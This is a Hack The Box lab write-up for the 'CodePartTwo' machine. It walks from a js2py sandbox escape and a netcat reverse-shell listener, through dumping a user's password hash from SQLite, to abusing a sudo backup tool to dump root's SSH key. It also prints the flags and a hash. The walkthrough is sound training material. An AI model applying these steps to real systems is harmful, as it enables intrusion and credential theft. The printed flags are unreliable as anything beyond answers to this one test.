# Hack The Box — CodePartTwo Write-Up

**Target IP:** `10.129.10.62`
**Difficulty:** Easy
**OS:** Linux

**User Flag:** `4db5d545fa957ce3e0f6a7b951f879a0`
**Root Flag:** `cca2aac950bb20a5ad67d24b9727778b`

---

## 1. Enumeration

### Nmap Scan

```bash
nmap 10.129.10.62 -p- -T4
```

Open ports identified:

* **22/tcp** — SSH
* **8000/tcp** — HTTP (Gunicorn / Flask)

---

## 2. Web Enumeration & Foothold

Browsing `http://10.129.10.62:8000` reveals a Flask web application with:

* Login / Register
* JavaScript code editor
* `/run_code` endpoint

The downloaded application source shows:

```txt
js2py==0.74
```

This version is vulnerable to **CVE-2024-28397**, a **js2py sandbox escape**, allowing arbitrary Python execution.

---

## 3. Exploitation — RCE via js2py Sandbox Escape

Using a public PoC for CVE-2024-28397, the JavaScript sandbox is escaped by abusing Python object traversal to reach `subprocess.Popen`.

A reverse shell payload is executed via the `/run_code` endpoint.

### Listener

```bash
nc -nvlp 5001
```

A shell is received as:

```txt
app@codeparttwo
```

---

## 4. Shell Stabilization

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## 5. Lateral Movement — App → Marco

While enumerating the application directory:

```bash
cd instance
ls
```

An SQLite database is found:

```bash
users.db
```

Extracting credentials:

```bash
sqlite3 users.db
.tables
select * from user;
```

Result:

```txt
marco | 649c9d65a206a75f5abe509fe128bce5
```

The hash is cracked (MD5), yielding valid credentials for **marco**.

### SSH Access

```bash
ssh marco@10.129.10.62
```

---

## 6. User Flag

```bash
cat ~/user.txt
```

**User Flag**

```
4db5d545fa957ce3e0f6a7b951f879a0
```

---

## 7. Privilege Escalation Enumeration

```bash
sudo -l
```

Output:

```txt
(ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

A writable configuration file exists:

```bash
npbackup.conf
```

---

## 8. Privilege Escalation — Backup Abuse (Your Method)

### Step 1: Copy and Modify Config

```bash
cp npbackup.conf npbackup1.conf
nano npbackup1.conf
```

Modify the backup path:

```yaml
backup_opts:
  paths:
    - /root
```

---

### Step 2: Run Backup as Root

```bash
sudo -u root /usr/local/bin/npbackup-cli -c npbackup1.conf -b -f
```

This creates a backup snapshot of `/root`.

---

### Step 3: Dump Root SSH Key

```bash
sudo -u root /usr/local/bin/npbackup-cli -c npbackup1.conf --dump /root/.ssh/id_rsa
```

Save the key locally:

```bash
chmod 600 id_rsa
```

---

### Step 4: SSH as Root

```bash
ssh -i id_rsa root@10.129.10.62
```

---

## 9. Root Flag

```bash
cat /root/root.txt
```

**Root Flag**

```
cca2aac950bb20a5ad67d24b9727778b
```

---

## 10. Summary

| Stage                | Technique                             |
| -------------------- | ------------------------------------- |
| Initial Access       | js2py sandbox escape (CVE-2024-28397) |
| Foothold             | Reverse shell via `/run_code`         |
| Lateral Move         | SQLite credential extraction          |
| Privilege Escalation | `npbackup-cli` config abuse           |
| Root Access          | Dumped root SSH private key           |

---

## Final Notes

* Privilege escalation was achieved **without command execution**, purely by **abusing trusted backup functionality**
* Misconfigured **NOPASSWD backup utilities** are extremely dangerous
* Backup software must **never** allow user-controlled paths when run as root

